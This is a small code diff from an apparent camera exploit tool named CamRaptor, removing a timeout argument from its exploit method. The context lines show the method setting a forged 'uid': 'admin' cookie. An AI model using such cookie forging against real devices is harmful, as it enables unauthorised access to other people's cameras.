@@ -30,7 +30,7 @@ import requests
 
 class CamRaptor:
     @staticmethod
-    def exploit(address, timeout=3):
+    def exploit(address):
         try:
             cookies = {
                 "uid": "admin"
